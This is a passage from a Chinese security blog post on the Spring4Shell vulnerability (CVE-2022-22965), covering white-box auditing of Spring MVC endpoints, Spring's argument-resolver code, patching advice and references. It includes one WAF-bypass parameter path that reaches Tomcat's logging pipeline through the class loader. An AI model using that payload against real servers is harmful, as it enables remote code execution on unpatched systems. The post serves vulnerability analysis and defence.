<h3 id="ç™½ç›’"><a href="#ç™½ç›’" class="headerlink" title="ç™½ç›’"></a>ç™½ç›’</h3><h4 id="ä½¿ç”¨-RequestBody"><a href="#ä½¿ç”¨-RequestBody" class="headerlink" title="ä½¿ç”¨@RequestBody"></a>ä½¿ç”¨@RequestBody</h4><p>å…ˆæ£€æŸ¥é¡¹ç›®ä¸­ä½¿ç”¨POJOçš„æ¥å£ï¼Œç„¶åå†æ£€æŸ¥æ˜¯å¦ä½¿ç”¨äº†<code>@RequestBody</code>æ³¨è§£ã€‚ä½¿ç”¨<code>@RequestBody</code>æ³¨è§£çš„æ¥å£æ˜¯æ¥æ”¶JSONå’ŒXMLç­‰è¯·æ±‚ï¼Œåº•å±‚ä½¿ç”¨<code>RequestResponseBodyMethodProcessor</code>å¤„ç†è¯·æ±‚ï¼Œè€ŒContent-Typeæ˜¯<code>application/x-www-form-urlencoded</code>çš„æ—¶å€™ï¼Œä¼šä½¿ç”¨<code>ServletModelAttributeMethodProcessor</code>è§£æè¯·æ±‚ã€‚æ‰€ä»¥ä½¿ç”¨<code>@RequestBody</code>çš„æ—¶å€™ä¸å­˜åœ¨æ¼æ´ï¼Œå¯ä»¥ä½¿ç”¨egrepåˆæ­¥åŒ¹é…ä¹‹åï¼Œæ’æŸ¥æ²¡æœ‰ä½¿ç”¨<code>@RequestBody</code>çš„æ¥å£:</p>
<pre class="line-numbers language-none"><code class="language-none">egrep -5  -ri &quot;@(Get|Post|Put|Delete|Patch|Request)Mapping&quot; .<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>åœ¨ä½¿ç”¨<code>@RequestBody</code>çš„æ—¶å€™ï¼Œå¦‚æœè‡ªå®šä¹‰äº†<a target="_blank" rel="noopener" href="https://blog.csdn.net/justry_deng/article/details/99875548">å‚æ•°è§£æå™¨</a>ï¼Œä¹Ÿå°±æ˜¯è¯´åç«¯å¯ä»¥åŒæ—¶æ¥æ”¶<code>application/json</code>å’Œ<code>application/x-www-form-urlencoded</code>è¿™ä¸¤ç§è¯·æ±‚ï¼Œä¹Ÿå¯èƒ½å­˜åœ¨æ¼æ´ã€‚åœ¨æµ‹è¯•JSONæ¥å£çš„æ—¶å€™å¯ä»¥æ”¹å˜Content-Typeä¸º<code>application/x-www-form-urlencoded</code>åšä¸€æ¬¡å°è¯•ã€‚</p>
<p>SpringMVCçš„<code>HandlerMethodArgumentResolver</code>æ˜¯æ–¹æ³•å‚æ•°è§£æå™¨æ¥å£ï¼Œè¿™ä¸ªæ¥å£æ˜¯SpringMVCå‚æ•°è§£æç»‘å®šçš„æ ¸å¿ƒæ¥å£ï¼Œå†…ç½®äº†å¾ˆå¤šç±»å®Œæˆ<a target="_blank" rel="noopener" href="https://github.com/spring-projects/spring-framework/blob/d84ca2ba90d27a7c63d7b35a6259b5b9cf341118/spring-webmvc/src/main/java/org/springframework/web/servlet/mvc/method/annotation/RequestMappingHandlerAdapter.java#L644">å‚æ•°è§£æ</a>ï¼š</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">HandlerMethodArgumentResolver</span><span class="token punctuation">></span></span> <span class="token function">getDefaultArgumentResolvers</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">HandlerMethodArgumentResolver</span><span class="token punctuation">></span></span> resolvers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">// Annotation-based argument resolution</span>
		resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestParamMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestParamMapMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">PathVariableMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">PathVariableMapMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MatrixVariableMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MatrixVariableMapMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ServletModelAttributeMethodProcessor</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestResponseBodyMethodProcessor</span><span class="token punctuation">(</span><span class="token function">getMessageConverters</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>requestResponseBodyAdvice<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestPartMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token function">getMessageConverters</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>requestResponseBodyAdvice<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestHeaderMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestHeaderMapMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ServletCookieValueMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ExpressionValueMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token function">getBeanFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SessionAttributeMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RequestAttributeMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">// Type-based argument resolution</span>
		resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ServletRequestMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ServletResponseMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">HttpEntityMethodProcessor</span><span class="token punctuation">(</span><span class="token function">getMessageConverters</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>requestResponseBodyAdvice<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">RedirectAttributesMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ModelMethodProcessor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MapMethodProcessor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ErrorsMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">SessionStatusMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">UriComponentsBuilderMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">KotlinDetector</span><span class="token punctuation">.</span><span class="token function">isKotlinPresent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			resolvers<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ContinuationHandlerMethodArgumentResolver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æ¯”å¦‚:</p>
<ul>
<li><code>RequestParamMethodArgumentResolver</code>ï¼š   è´Ÿè´£è§£æ @RequestParam æ ‡è®°çš„å‚æ•°</li>
<li><code>ServletRequestMethodArgumentResolver</code>ï¼š è´Ÿè´£è§£æå…¥å‚ä¸º HttpServletRequestã€HttpMethod ç­‰ç±»å‹çš„å‚æ•°</li>
<li><code>ServletModelAttributeMethodProcessor</code>ï¼š è´Ÿè´£è§£æå…¥å‚ä¸º POJO ç±»çš„å‚æ•°</li>
<li><code>RequestResponseBodyMethodProcessor</code>ï¼š   è´Ÿè´£è§£æå…¥å‚ä¸º @RequestBody æ ‡æ³¨çš„å‚æ•°</li>
</ul>
<h4 id="ä½¿ç”¨consumesçš„æ—¶å€™"><a href="#ä½¿ç”¨consumesçš„æ—¶å€™" class="headerlink" title="ä½¿ç”¨consumesçš„æ—¶å€™"></a>ä½¿ç”¨consumesçš„æ—¶å€™</h4><p><code>@RequestMapping(value = &quot;/rapid7/v1&quot;, method = &#123;RequestMethod.GET, RequestMethod.POST&#125;, consumes = &quot;application/json&quot;)</code><br>ç»è¿‡æµ‹è¯•ï¼Œæœªè§¦å‘æ¼æ´</p>
<h4 id="WAFç»•è¿‡"><a href="#WAFç»•è¿‡" class="headerlink" title="WAFç»•è¿‡"></a>WAFç»•è¿‡</h4><p>æ¥è‡ª<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/plFLE8e0-Fc2tHJ4HaiSSw">çƒ½ç«å°å®éªŒå®¤çš„ç»•è¿‡</a>ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">class.module.classLoader.resources.context.resources.context.parent.pipeline.first.pattern<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>å‡çº§Spring Frameworkåˆ°v5.3.18æˆ–v5.2.20</p>
<p>Springå‡çº§ä¹‹åTomcatä¹Ÿå‘å¸ƒäº†æ–°ç‰ˆæœ¬ï¼Œåœ¨<code>Tomcat 9.0.62</code>ç‰ˆæœ¬å¯¹<code>getResources()</code>æ–¹æ³•çš„è¿”å›å€¼åšäº†ä¿®æ”¹ï¼Œç›´æ¥è¿”å›nullã€‚<code>WebappClassLoaderBase</code>å³<code>ParallelWebappClassLoader</code>çš„çˆ¶ç±»ï¼Œåœ¨Webåº”ç”¨éƒ¨ç½²æ–¹å¼ä¸­ï¼Œåˆ©ç”¨<code>org.apache.catalina.loader.ParallelWebappClassLoader.getResources()</code>çš„é“¾è·¯å°±èµ°ä¸é€šäº†ã€‚<br><img src="/2022/04/06/CVE-2022-22965/9.png"></p>
<p>å…¶å®ƒä¸­é—´ä»¶çš„éƒ¨åˆ†ç¯å¢ƒå˜é‡å¯ä»¥å‚è€ƒ<a target="_blank" rel="noopener" href="https://github.com/julianvilas/rooted2k15/blob/a00055f906/struts-tester/results/struts2-tomcat8-debug.txt">struts-tester</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/267124">RWCTF 4th Desperate Cat Writeup</a>çš„å®é™…æ¡ˆä¾‹çš„åˆ©ç”¨åŸç†ä¹Ÿå·®ä¸å¤šï¼Œä½†æ˜¯æ›´æœ‰è¶£ã€‚</p>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul>
<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1532/">ä»é›¶å¼€å§‹ï¼Œåˆ†æSpring Framework RCE</a></li>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/plFLE8e0-Fc2tHJ4HaiSSw">å…³äºSpring framework rceï¼ˆCVE-2022-22965ï¼‰çš„ä¸€äº›é—®é¢˜æ€è€ƒ</a></li>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/G1z7mydl4nc9SxcZjwUQwg">CVE-2022-22965 Springæ ¸å¿ƒæ¡†æ¶Spring4Shellè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´åŸç†ä¸ä¿®å¤æ–¹å¼åˆ†æ</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/nuclei-templates/blob/6020f5f7e74135970bc283317cc303fc6597b1e5/cves/2022/CVE-2022-22965.yaml">nuclei-templates</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11129">Spring Beans RCEåˆ†æ</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/267124">RWCTF 4th Desperate Cat Writeup</a></li>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/bG3BCdM-suCZldN7FIpYqw">Spring å‚æ•°ç»‘å®šçš„åˆ†æä»¥åŠç”²æ–¹è‡ªæŸ¥</a></li>
<li><a target="_blank" rel="noopener" href="https://d3fence.com/spring4shell-CVE-2022-22965-e2bdda3a816a4e5480a0bbcaabda2f8d">spring4shellï¼ˆCVE-2022-22965ï¼‰äº‹ä»¶è€ƒå¤èµ„æ–™æ¢³ç†</a></li>
<li><a target="_blank" rel="noopener" href="https://juejin.cn/post/6894026079116197896">SpringMVC å…¥å‚è§£æåŸç†å’Œå®æˆ˜</a></li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/w-y-c-m/p/8443892.html">SpringMVCæºç ä¹‹å‚æ•°è§£æç»‘å®šåŸç†</a></li>
<li><a target="_blank" rel="noopener" href="https://www.aqniu.com/industry/82365.html">Springè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆCVE-2022-22965ï¼‰åŸç†åˆ†æå’Œæ€è€ƒ</a></li>
</ul>

	</div>

	
	<span id="/2022/04/06/CVE-2022-22965.html" class="leancloud-visitors view" data-flag-title="CVE-2022-22965æ¼æ´è®°å½•">
	</span>
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2022/04/11/burpsuite-ext-dev.html" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2022/03/30/Load_Class_In_Multi_JavaVersion.html" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2022-04-06 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/Java/">Java<span>8</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%BC%8F%E6%B4%9E%E6%97%B6%E9%97%B4%E7%BA%BF"><span class="toc-article-text">æ¼æ´æ—¶é—´çº¿</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#POC"><span class="toc-article-text">POC</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-article-text">åˆ©ç”¨æ¡ä»¶</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-article-text">æ³¨æ„äº‹é¡¹</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-article-text">æ¼æ´åˆ†æ</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A4%E6%96%AD"><span class="toc-article-text">æ¼æ´åˆ¤æ–­</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%A0%B9%E6%8D%AE%E7%8A%B6%E6%80%81%E7%A0%81"><span class="toc-article-text">æ ¹æ®çŠ¶æ€ç </span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E9%80%9A%E8%BF%87SSRF"><span class="toc-article-text">é€šè¿‡SSRF</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E7%99%BD%E7%9B%92"><span class="toc-article-text">ç™½ç›’</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8-RequestBody"><span class="toc-article-text">ä½¿ç”¨@RequestBody</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E4%BD%BF%E7%94%A8consumes%E7%9A%84%E6%97%B6%E5%80%99"><span class="toc-article-text">ä½¿ç”¨consumesçš„æ—¶å€™</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#WAF%E7%BB%95%E8%BF%87"><span class="toc-article-text">WAFç»•è¿‡</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-article-text">æ¼æ´ä¿®å¤</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-article-text">å‚è€ƒé“¾æ¥</span></a></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2022 JKme's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>â¬†ï¸TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
